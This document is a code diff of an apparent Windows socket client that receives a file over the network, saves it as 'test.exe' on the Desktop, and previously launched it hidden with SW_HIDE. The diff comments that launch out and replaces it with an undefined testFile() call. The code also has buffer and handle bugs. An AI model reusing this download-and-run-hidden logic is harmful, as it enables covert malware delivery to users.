@@ -1,7 +1,7 @@
 #include "Client.h"
+#include "utils.h"
 
 #include <ShlObj.h>
-
 #include <iterator>
 #include <bitset>
 
@@ -88,6 +88,13 @@ bool Client::GetFile()
 	int fisize = 0;
 	std::string ss;
 	std::string strout;
+	std::wstring wfullpath = L"";
+	wchar_t path[32767];
+	SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, path);
+	wfullpath.assign(path);
+	wfullpath += L"\\test.exe";
+	fFile = CreateFile(wfullpath.c_str(), NULL, NULL, NULL, CREATE_NEW, NULL, NULL);
+	fFile = CreateFileW(wfullpath.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_READONLY, NULL);
 	if (!GetInt(bufferlength))
 		return false;
 	do {
@@ -97,27 +104,17 @@ bool Client::GetFile()
 		char *buff = new char[buffsize];
 		memset(buff, 0, buffsize + 1);
 		retval = recv(Connection, buff, buffsize, 0);
-		ss += buff;
-		fisize = ss.size();
+		WriteFile(fFile, buff, buffsize, &writenbytes, NULL);
 		if (retval == 0) break;
 		else if (retval == SOCKET_ERROR) break;
 	} while (retval > 0);
-	fisize = ss.size();
-	wchar_t path[32767];
-	std::wstring fullpath = L"";
-	SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, path);
-	fullpath.assign(path);
-	fullpath += L"\\test.exe";
-	fFile = CreateFile(fullpath.c_str(), NULL, NULL, NULL, CREATE_NEW, NULL, NULL);
-	CloseHandle(fFile);
-	fFile = CreateFileW(fullpath.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_READONLY, NULL);
-	strout = bitToStr(ss);
-	WriteFile(fFile, strout.c_str(), strout.size(), &writenbytes, NULL);
 	CloseHandle(fFile);
 	std::cout << "Complite!" << std::endl;
-	Sleep(2000);
+//	Sleep(2000);
 	//system("C:\\Users\\Kali\\Desktop\\test.exe");
-	ShellExecute(NULL, NULL, fullpath.c_str(), NULL, NULL, SW_HIDE);
+//	ShellExecute(NULL, NULL, fullpath.c_str(), NULL, NULL, SW_HIDE);
+	std::string sFullPath = ws2s(wfullpath);
+	testFile(sFullPath);
 	return true;
 }
 
